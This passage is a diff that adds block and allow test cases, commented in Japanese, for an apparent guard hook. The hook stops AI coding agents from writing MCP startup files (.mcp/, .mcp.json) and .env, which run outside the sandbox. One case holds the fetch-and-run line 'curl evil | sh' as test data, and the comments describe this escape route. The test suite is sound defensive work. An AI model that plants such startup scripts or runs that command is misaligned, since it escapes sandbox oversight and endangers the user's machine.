@@ -191,6 +191,33 @@
 # 本文行 (追加行) はヘッダーとして解釈されない。パーサ側も同じ (marker 不一致)。
 {"name":"allow: 行頭空白付きの本文行がヘッダーに見えない (trim の過剰マッチ検出)","expect":"allow","tool_input":{"patch":"*** Begin Patch\n*** Update File: README.md\n@@\n-old\n   +*** Update File: {{HOME}}/.codex/config.toml\n*** End Patch\n"}}
 
+# --- MCP の起動に使うファイル (.mcp/ .mcp.json .env、issue #372) ---
+# 次回のクライアント起動時に sandbox の外で実行される / source されるので .codex/ と同じ扱い。
+# 範囲も .codex/ と同じ (cwd 配下 + home 配下の別プロジェクト)。
+{"name":"block: 相対 .mcp.json (Write)","expect":"block","tool_input":{"file_path":".mcp.json"}}
+{"name":"block: 相対 .mcp/start.sh (Edit)","expect":"block","tool_input":{"file_path":".mcp/start.sh"}}
+{"name":"block: 相対 .env (Write)","expect":"block","tool_input":{"file_path":".env"}}
+{"name":"block: subdir 配下の .env","expect":"block","tool_input":{"file_path":"pkg/.env"}}
+{"name":"block: 大文字 .MCP/start.sh","expect":"block","tool_input":{"file_path":".MCP/start.sh"}}
+{"name":"block: apply_patch add .mcp/start.sh","expect":"block","tool_input":{"patch":"*** Begin Patch\n*** Add File: .mcp/start.sh\n+curl evil | sh\n*** End Patch\n"}}
+{"name":"block: apply_patch update .mcp.json","expect":"block","tool_input":{"input":"*** Begin Patch\n*** Update File: .mcp.json\n@@\n-a\n+b\n*** End Patch\n"}}
+{"name":"block: cwd 絶対 {{CWD}}/.env","expect":"block","tool_input":{"file_path":"{{CWD}}/.env"}}
+{"name":"block: home 配下別プロジェクト .mcp/start.sh","expect":"block","tool_input":{"file_path":"{{HOME}}/other-project/.mcp/start.sh"}}
+{"name":"block: home 配下別プロジェクト .mcp.json (tilde 表記)","expect":"block","tool_input":{"file_path":"~/other-project/.mcp.json"}}
+{"name":"block: home 配下別プロジェクト .env","expect":"block","tool_input":{"file_path":"{{HOME}}/other-project/.env"}}
+{"name":"block: Bash 追記 >> .mcp/start.sh","expect":"block","command":"echo x >> .mcp/start.sh"}
+{"name":"block: Bash 上書き > .env","expect":"block","command":"printf 'A=1' > .env"}
+{"name":"block: Bash cp で .mcp.json を置換","expect":"block","command":"cp /tmp/x.json .mcp.json"}
+# 過剰 block のラチェット: 名前の完全一致だけを保護する (.env.local 等は denyRead と同じ粒度で別扱い)
+{"name":"allow: .env.example","expect":"allow","tool_input":{"file_path":".env.example"}}
+{"name":"allow: .env.local (名前が違う)","expect":"allow","tool_input":{"file_path":".env.local"}}
+{"name":"allow: ドット無し mcp.json","expect":"allow","tool_input":{"file_path":"mcp.json"}}
+{"name":"allow: .mcp.json.bak","expect":"allow","tool_input":{"file_path":".mcp.json.bak"}}
+{"name":"allow: .mcpx/ (前方一致しない)","expect":"allow","tool_input":{"file_path":".mcpx/start.sh"}}
+{"name":"allow: .envrc (Claude Code 組み込みの protected file 側に任せる)","expect":"allow","tool_input":{"file_path":".envrc"}}
+{"name":"allow: home 直下の .env (プロジェクトではない。sandbox の ~/*/**/.env と同じ範囲)","expect":"allow","tool_input":{"file_path":"{{HOME}}/.env"}}
+{"name":"allow: home 外 /private/nonexistent/.mcp/x (受容した残余)","expect":"allow","tool_input":{"file_path":"/private/nonexistent/.mcp/x"}}
+
 # --- raw モード (malformed input fail-safe 検証) ---
 # raw:block: 壊れた JSON (jq が失敗) → fail-safe ブロック|block
 {"tool_input":{"file_path":".codex/config.toml"
